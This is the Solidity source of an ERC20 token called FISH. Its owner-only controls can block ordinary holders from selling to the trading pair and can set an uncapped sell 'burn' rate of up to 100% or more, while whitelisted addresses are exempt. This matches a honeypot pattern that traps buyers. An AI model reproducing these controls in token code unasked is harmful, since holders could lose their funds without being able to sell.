pragma solidity >=0.5.0;
// SPDX-License-Identifier: Unlicensed

import '../lib/SafeMath.sol';
import '../open/token/ERC20/IERC20.sol';

contract FishToken is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) internal _tOwned;
    mapping (address => mapping (address => uint256)) internal _allowances;

    string internal _name; 
    string internal _symbol;
    uint256 internal _decimals;
    uint256 internal _tTotal;

    address public _owner;
    uint public burnRate = 50;
    address public uniswapV2Pair;
    address constant public burnAddress = address(0x0);

    bool public isStartSwapSell = false;

    mapping(address => bool) public isInWhiteList;

    modifier onlyOwner() {
        require(msg.sender == _owner, "admin: wut?");
        _;
    }

    constructor (
        uint256 _supply,
        address _holder,
        address _ownerAddress
    ) public {
        _decimals = 18;
        _tTotal = _supply * 10 ** _decimals;
        _name = "FISH";
        _symbol = "FISH";
        isInWhiteList[_holder] = true;
        _tOwned[_holder] = _tTotal;
        emit Transfer(address(0), _holder, _tTotal);
        _owner = _ownerAddress;
    }

    function setInWhite(address owner,bool isIn) external onlyOwner{
        isInWhiteList[owner] = isIn;
    }

    function setBurnRate(uint _rate) external  onlyOwner{
        burnRate = _rate;
    }

    function setPair(address pair) external  onlyOwner{
        uniswapV2Pair = pair;
    }

    function startSwapSell(bool isStart)external onlyOwner{
        isStartSwapSell = isStart;
    }

    function transferOwner(address newO)external  onlyOwner{
        _owner = newO;
    }

    function name() public  view returns (string memory) {
        return _name;
    }

    function symbol() public  view returns (string memory) {
        return _symbol;
    }

    function decimals() public  view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
         return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);

        address msgSender = msg.sender;
        _approve(sender, msgSender, _allowances[sender][msgSender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");

        uint acceptAmount = amount;

        if( uniswapV2Pair != address(0) && to == uniswapV2Pair  ){

            if( !isInWhiteList[from] ){
                require(isStartSwapSell ,"not start swap sell");

                if( burnRate > 0 ){
                    uint fee = amount * burnRate / 100;
                    acceptAmount -= fee;
                    _tOwned[burnAddress] = _tOwned[burnAddress].add(fee);
                    emit Transfer(from, burnAddress, fee);
                }
            }
        }       

        _tOwned[from] = _tOwned[from].sub(amount);
        _tOwned[to] = _tOwned[to].add(acceptAmount);
        emit Transfer(from, to, acceptAmount);
    }
}
